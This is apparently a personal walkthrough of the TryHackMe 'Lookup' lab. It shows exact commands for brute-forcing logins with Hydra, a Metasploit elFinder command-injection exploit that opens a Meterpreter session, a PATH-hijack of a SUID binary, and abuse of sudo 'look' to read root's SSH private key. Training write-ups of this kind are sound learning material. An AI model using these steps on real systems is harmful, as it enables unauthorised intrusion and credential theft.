# TryHackMe - Lookup Room Writeup

## Overview

This is a detailed walkthrough of how I rooted the **Lookup** room on TryHackMe and captured both user and root flags. The room involved web application enumeration, brute force attacks, a command injection vulnerability, and privilege escalation through misconfigured binaries.

---

## Enumeration

I started the engagement with an `nmap` scan:

```bash
nmap -sC -sV -oN initial_scan.txt <target-ip>
```

The scan revealed two open ports:

- **22** (SSH)
- **80** (HTTP)

---

## Web Application Discovery

Accessing port 80 initially led nowhere. I suspected a virtual host configuration, so I added an entry to my `/etc/hosts` file:

```
<target-ip> lookup.thm
```

After updating the hosts file, I accessed `http://lookup.thm` and was greeted with a **login page**.

---

## Username Enumeration

Upon analyzing the login functionality, I noticed:

- Wrong **username + password** → "wrong username or password"
- Correct **username**, wrong password → "wrong password"

This behavior hinted at a potential for **user enumeration**.

Using **Burp Suite Intruder** with a **Sniper attack** and the `apache-user-enum_1.0.txt` wordlist, I discovered a valid user:

- **Username:** `jose`

---

## Password Brute-Forcing

I then used **Hydra** to brute force the password for `jose`:

```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login:username=^USER^&password=^PASS^:F=Wrong"
```

- **Password found:** `password123`

---

## File Manager Exploitation

After logging in, I was redirected to another subdomain: `files.lookup.thm`. I added it to `/etc/hosts` as well.

The site was running **elFinder**, a file manager.

### Exploitation using Metasploit

I loaded the following Metasploit module:

```
exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```

Configured with:

- `RHOSTS`: `files.lookup.thm`
- `LHOST`: My machine's IP

This yielded a **Meterpreter session**.

---

## Privilege Escalation - Part 1 (User)

Inside the Meterpreter session:

- Navigated to `/home` and found the user folder `think`.
- Discovered `user.txt` but could not access it.

I then searched for SUID binaries:

```bash
find / -perm /4000 2>/dev/null
```

Found:

```bash
/usr/sbin/pwm
```

It was running with **root privileges**.

On execution, it appeared to run `id`. I exploited this by overriding the `id` command:

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```

This provided me with potential passwords. I used them to brute force SSH:

```bash
hydra -l think -P pwm_passwords.txt ssh://<target-ip>
```

- Successfully logged in as **think**
- Retrieved the **user flag** from `user.txt`

---

## Privilege Escalation - Part 2 (Root)

I checked `think`’s sudo privileges:

```bash
sudo -l
```

Output showed:

```bash
(ALL : ALL) NOPASSWD: /usr/bin/look
```

According to **GTFOBins**, `look` can be exploited to read arbitrary files. I retrieved the root SSH private key:

```bash
LFILE=/root/.ssh/id_rsa
sudo look '' "$LFILE"
```

Saved the output and changed permissions:

```bash
chmod 600 id_rsa
ssh -i id_rsa root@<target-ip>
```

Logged in as **root** and obtained the **root flag** from `root.txt`.

---

## Conclusion

The Lookup room involved a mix of:

- Web app reconnaissance
- Login enumeration
- Credential brute-forcing
- Remote code execution via a known exploit
- SUID binary path manipulation
- Sudo misconfigurations

Each step built on the last, and it was a great exercise in real-world exploitation chains.

---
🖼️ **Find all screenshots here:** [`screenshots/lookup/`](../screenshots/lookup/)

*Thanks for reading!*
